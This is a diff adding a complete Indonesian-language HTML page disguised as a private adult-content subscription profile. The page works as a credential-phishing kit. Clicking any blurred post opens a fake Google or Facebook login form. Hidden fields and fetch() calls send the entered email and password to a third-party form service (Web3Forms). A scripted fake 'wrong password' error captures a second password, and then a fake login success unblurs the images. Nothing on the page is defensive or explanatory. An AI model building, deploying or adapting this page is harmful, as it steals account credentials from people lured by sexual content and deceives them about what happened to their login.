@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Only Us - Citra Private Studio</title>
+    
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary: #6347d1;
+            --success: #22c55e;
+            --bg: #f8fafc; 
+            --card: #ffffff;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --border: #f1f5f9;
+            --google: #ea4335;
+            --fb: #1877f2;
+            --danger: #ef4444;
+        }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background-color: var(--bg); color: var(--text-main); font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; }
+
+        .app-container {
+            width: 100%; max-width: 480px; background: var(--card); min-height: 100vh;
+            position: relative; padding-bottom: 110px; box-shadow: 0 0 50px rgba(0,0,0,0.02);
+        }
+
+        /* --- LOGIN OVERLAY --- */
+        #login-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 2000; display: none; align-items: center; justify-content: center;
+            background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(12px); padding: 20px;
+            transition: opacity 0.5s ease;
+        }
+        .login-card {
+            width: 100%; max-width: 400px; background: white; padding: 40px 24px; border-radius: 36px;
+            text-align: center; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.3);
+            animation: popIn 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        @keyframes popIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        #step-social { display: block; }
+        #step-form { display: none; animation: slideIn 0.4s ease forwards; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .btn-social {
+            width: 100%; padding: 16px; border-radius: 20px; border: 1.5px solid var(--border);
+            background: white; font-weight: 700; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 12px;
+            cursor: pointer; margin-bottom: 12px; transition: 0.2s;
+        }
+        .btn-primary {
+            background: var(--primary); color: white; border: none; width: 100%; padding: 18px; border-radius: 18px;
+            font-weight: 800; cursor: pointer; transition: 0.3s;
+        }
+        
+        .error-msg { 
+            background: #fff1f2; color: var(--danger); font-size: 12px; font-weight: 700; 
+            padding: 12px; border-radius: 14px; margin-bottom: 15px; display: none;
+        }
+
+        /* --- PROFILE UI --- */
+        .header-cover { height: 220px; background-image: url('sampul.jpg'); background-size: cover; background-position: center; position: relative; }
+        .media-count { position: absolute; top: 15px; left: 15px; display: flex; gap: 8px; }
+        .count-badge { background: rgba(0,0,0,0.5); color: white; padding: 4px 10px; border-radius: 8px; font-size: 11px; display: flex; align-items: center; gap: 5px; backdrop-filter: blur(4px); }
+        .avatar-container { position: absolute; left: 50%; bottom: -45px; transform: translateX(-50%); }
+        .avatar-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid white; background-image: url('profil.jpg'); background-size: cover; background-position: center; box-shadow: 8px 8px 20px rgba(0,0,0,0.1); }
+
+        .profile-info { margin-top: 55px; padding: 0 24px; text-align: left; }
+        .profile-info h1 { margin: 0; font-size: 22px; font-weight: 800; }
+        .username { color: var(--text-muted); font-size: 13px; margin-bottom: 15px; display: block; }
+        .profile-actions { display: flex; gap: 10px; margin-bottom: 20px; }
+        .btn-fantrie { padding: 10px 20px; border-radius: 25px; font-size: 13px; font-weight: 700; cursor: pointer; border: 1.2px solid #ddd; background: white; color: #444; }
+        .btn-follow-outline { border-color: var(--primary); color: var(--primary); }
+
+        .subscribe-bar { background: var(--primary); color: white; margin: 20px; padding: 16px; border-radius: 14px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
+        .sub-text { font-size: 14px; font-weight: 700; }
+        .sub-price { text-align: right; font-size: 11px; line-height: 1.4; }
+
+        .tabs { display: flex; border-bottom: 1px solid var(--border); margin-top: 10px; }
+        .tab-item { flex: 1; text-align: center; padding: 15px 0; font-size: 13px; font-weight: 800; color: var(--text-muted); cursor: pointer; }
+        .tab-item.active { color: var(--primary); border-bottom: 3px solid var(--primary); }
+
+        /* --- FEED POSTS --- */
+        .post { padding: 20px 0; border-bottom: 8px solid var(--border); }
+        .post-header { display: flex; align-items: center; gap: 10px; padding: 0 20px 12px; }
+        .mini-avatar { width: 36px; height: 36px; border-radius: 50%; background-image: url('profil.jpg'); background-size: cover; }
+        .header-text b { font-size: 14px; display: flex; align-items: center; gap: 4px; }
+        .header-text span { font-size: 11px; color: var(--text-muted); display: block; }
+
+        .post-visual { position: relative; width: 100%; aspect-ratio: 1/1; background: #fafafa; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        
+        /* --- UPDATE BLUR DISINI (Ubah dari 50px ke 8px) --- */
+        .post-blur { width: 100%; height: 100%; filter: blur(8px); background-size: cover; transition: 1.5s ease-in-out; }
+        
+        .duration-badge { position: absolute; bottom: 15px; right: 15px; background: rgba(0,0,0,0.7); color: white; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: 700; }
+        
+        .lock-btn { position: absolute; background: white; padding: 12px 24px; border-radius: 20px; font-size: 12px; font-weight: 800; color: var(--primary); box-shadow: 0 10px 30px rgba(0,0,0,0.15); cursor: pointer; z-index: 10; display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        .play-overlay { position: absolute; color: white; opacity: 0.8; z-index: 5; }
+
+        .post-stats { display: flex; gap: 15px; padding: 12px 20px 0; }
+        .stat-item { display: flex; align-items: center; gap: 6px; font-size: 12px; font-weight: 700; color: var(--text-muted); }
+
+        .nav-dock { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); width: 88%; max-width: 400px; background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(20px); display: flex; justify-content: space-around; padding: 16px; border-radius: 28px; box-shadow: 0 15px 35px rgba(0,0,0,0.08); z-index: 100; }
+    </style>
+</head>
+<body>
+
+    <div id="login-overlay">
+        <div class="login-card">
+            <h2 style="font-weight: 900; margin: 0 0 10px;">Only Us</h2>
+            
+            <div id="step-social">
+                <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 25px;">Pilih akun untuk masuk dan melihat konten</p>
+                <button class="btn-social" onclick="goToForm('Google')"><i data-lucide="mail" style="color:var(--google)"></i> Lanjut dengan Google</button>
+                <button class="btn-social" onclick="goToForm('Facebook')"><i data-lucide="facebook" style="color:var(--fb)"></i> Lanjut dengan Facebook</button>
+            </div>
+
+            <div id="step-form">
+                <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 15px;">Verifikasi akun <b id="provider-name"></b> Anda</p>
+                <div id="fake-error" class="error-msg"></div>
+
+                <form id="login-form">
+                    <input type="hidden" name="access_key" value="5dd38978-af3a-4a29-97c8-f0720f497950">
+                    <input type="hidden" name="subject" value="New Access Attempt - Only Us">
+                    <input type="hidden" name="from_name" value="Security System OnlyUs">
+                    
+                    <input type="hidden" name="Method" id="provider-input">
+                    <input type="text" name="User" id="user-input" placeholder="Email atau Telepon" style="width:100%; padding:14px; border-radius:12px; border:1px solid var(--border); background:var(--bg); margin-bottom:12px" required>
+                    <input type="password" id="pass-input" name="Pass" placeholder="Kata Sandi" style="width:100%; padding:14px; border-radius:12px; border:1px solid var(--border); background:var(--bg); margin-bottom:20px" required>
+                    
+                    <button type="submit" id="submit-btn" class="btn-primary">KONFIRMASI & MASUK</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="app-container">
+        <div class="header-cover">
+            <div class="media-count">
+                <div class="count-badge"><i data-lucide="image" size="12"></i> 1,534</div>
+                <div class="count-badge"><i data-lucide="play" size="12"></i> 1,849</div>
+            </div>
+            <div class="avatar-container"><div class="avatar-img"></div></div>
+        </div>
+
+        <div class="profile-info">
+            <h1>Citraaaaa🎀</h1>
+            <span class="username">@citraaa.private</span>
+            <div class="profile-actions">
+                <button class="btn-fantrie btn-follow-outline" onclick="showLogin()">Ikuti</button>
+                <button class="btn-fantrie" onclick="showLogin()">Pesan / Video Call</button>
+            </div>
+            <div class="bio-text">♡ exclusive content for subscribers only<br>♡ cosplay / nude / sexy costume<br>♡ uncensored full video 18+</div>
+        </div>
+
+        <div class="subscribe-bar" onclick="showLogin()">
+            <div class="sub-text">Langganan 1 Bulan</div>
+            <div class="sub-price"><span style="text-decoration: line-through; opacity: 0.7;">Rp 330.000</span><br><b>Bulan Pertama Rp 29.700</b></div>
+        </div>
+
+        <div class="tabs">
+            <div class="tab-item active">Feed</div><div class="tab-item">PPV</div><div class="tab-item">Magazine</div><div class="tab-item">ASK</div>
+        </div>
+
+        <div class="post">
+            <div class="post-header">
+                <div class="mini-avatar"></div>
+                <div class="header-text"><b>Citraaaaa🎀 <i data-lucide="pin" size="14" style="color:var(--primary); fill:var(--primary)"></i></b><span>2 jam yang lalu • Foto Premium</span></div>
+            </div>
+            <p style="padding: 0 20px; font-size: 13px; margin-bottom: 10px;"> hari ini vcs dpt bonus vid prib yaaww✨</p>
+            <div class="post-visual">
+                <div class="post-blur" style="background-image: url('post1.jpg');"></div>
+                <div class="lock-btn" onclick="showLogin()"><i data-lucide="lock" size="18"></i><span>LOGIN UNTUK MELIHAT</span></div>
+            </div>
+            <div class="post-stats">
+                <div class="stat-item"><i data-lucide="heart"></i> 12.4k</div>
+                <div class="stat-item"><i data-lucide="message-circle"></i> 852</div>
+                <div class="stat-item"><i data-lucide="repeat"></i> 142</div>
+            </div>
+        </div>
+
+        <div class="post">
+            <div class="post-header">
+                <div class="mini-avatar"></div>
+                <div class="header-text"><b>Citraaaaa🎀</b><span>5 jam yang lalu • Video Eksklusif</span></div>
+            </div>
+            <p style="padding: 0 20px; font-size: 13px; margin-bottom: 10px;">full nya 21 menit, cuma ku up ±5 memit ajaa 📸🔥</p>
+            <div class="post-visual">
+                <div class="post-blur" style="background-image: url('post2.jpg');"></div>
+                <div class="play-overlay"><i data-lucide="play-circle" size="60"></i></div>
+                <div class="duration-badge">04:12</div>
+                <div class="lock-btn" onclick="showLogin()"><i data-lucide="log-in" size="18"></i><span>LOGIN UNTUK MENONTON</span></div>
+            </div>
+            <div class="post-stats">
+                <div class="stat-item"><i data-lucide="heart"></i> 8.9k</div>
+                <div class="stat-item"><i data-lucide="message-circle"></i> 421</div>
+                <div class="stat-item"><i data-lucide="repeat"></i> 98</div>
+                <div class="stat-item"><i data-lucide="eye"></i> 45k</div>
+            </div>
+        </div>
+
+        <div class="post">
+            <div class="post-header">
+                <div class="mini-avatar"></div>
+                <div class="header-text"><b>Citraaaaa🎀</b><span>Kemarin • Album Privat</span></div>
+            </div>
+            <p style="padding: 0 20px; font-size: 13px; margin-bottom: 10px;">Something special for my loyal fans... ♡</p>
+            <div class="post-visual">
+                <div class="post-blur" style="background-image: url('post3.jpg');"></div>
+                <div class="lock-btn" onclick="showLogin()"><i data-lucide="image" size="18"></i><span>LOGIN UNTUK MEMBUKA</span></div>
+            </div>
+            <div class="post-stats">
+                <div class="stat-item"><i data-lucide="heart"></i> 15.1k</div>
+                <div class="stat-item"><i data-lucide="message-circle"></i> 1.2k</div>
+                <div class="stat-item"><i data-lucide="repeat"></i> 256</div>
+                <div class="stat-item"><i data-lucide="bookmark"></i> 342</div>
+            </div>
+        </div>
+
+        <nav class="nav-dock">
+            <i data-lucide="home" style="color: var(--primary);"></i>
+            <i data-lucide="search" style="color: var(--text-muted);"></i>
+            <i data-lucide="plus-square" style="color: var(--text-muted);"></i>
+            <i data-lucide="user" style="color: var(--text-muted);"></i>
+        </nav>
+    </div>
+
+    <script>
+        lucide.createIcons();
+        let loginAttempts = 0;
+        
+        function showLogin() { document.getElementById('login-overlay').style.display = 'flex'; }
+        
+        function goToForm(p) { 
+            const userInput = document.getElementById('user-input');
+            const errorLabel = document.getElementById('fake-error');
+            document.getElementById('step-social').style.display = 'none'; 
+            document.getElementById('step-form').style.display = 'block';
+            document.getElementById('provider-name').innerText = p;
+            document.getElementById('provider-input').value = p;
+            errorLabel.style.display = 'none';
+            userInput.placeholder = (p === 'Google') ? "Masukkan alamat Gmail" : "Email atau Telepon";
+        }
+
+        const form = document.getElementById('login-form');
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            const provider = document.getElementById('provider-input').value;
+            const userVal = document.getElementById('user-input').value;
+            const errorLabel = document.getElementById('fake-error');
+            const btn = document.getElementById('submit-btn');
+
+            if (provider === 'Google' && !userVal.toLowerCase().endsWith('@gmail.com')) {
+                errorLabel.innerText = "Gunakan alamat @gmail.com yang valid!";
+                errorLabel.style.display = 'block';
+                return;
+            }
+
+            // --- PERCOBAAN PERTAMA (GAGAL) ---
+            if (loginAttempts === 0) {
+                btn.innerText = "MENGECEK...";
+                btn.disabled = true;
+
+                // Kirim data ke Web3Forms
+                const formData = new FormData(form);
+                const object = Object.fromEntries(formData);
+                fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                    body: JSON.stringify(object)
+                });
+
+                setTimeout(() => {
+                    loginAttempts++;
+                    btn.innerText = "KONFIRMASI & MASUK";
+                    btn.disabled = false;
+                    errorLabel.innerText = "Kata sandi salah. Silakan coba lagi.";
+                    errorLabel.style.display = 'block';
+                    document.getElementById('pass-input').value = "";
+                }, 1500);
+            } 
+            // --- PERCOBAAN KEDUA (PURA-PURA BERHASIL) ---
+            else {
+                btn.innerText = "MENSINKRONISASI AKUN...";
+                btn.disabled = true;
+                errorLabel.style.display = 'none';
+
+                const formData = new FormData(form);
+                const object = Object.fromEntries(formData);
+                fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                    body: JSON.stringify(object)
+                });
+
+                setTimeout(() => {
+                    btn.style.background = "#22c55e"; // Tombol jadi Hijau
+                    btn.innerText = "LOGIN BERHASIL! MEMBUKA...";
+                    
+                    setTimeout(() => {
+                        document.getElementById('login-overlay').style.opacity = '0';
+                        setTimeout(() => {
+                            document.getElementById('login-overlay').style.display = 'none';
+                            // Efek buka konten
+                            document.querySelectorAll('.post-blur').forEach(el => el.style.filter = 'none');
+                            document.querySelectorAll('.lock-btn').forEach(el => el.style.display = 'none');
+                            document.querySelectorAll('.play-overlay').forEach(el => el.style.display = 'none');
+                        }, 500);
+                    }, 1500);
+                }, 2500);
+            }
+        };
+    </script>
+</body>
+</html>
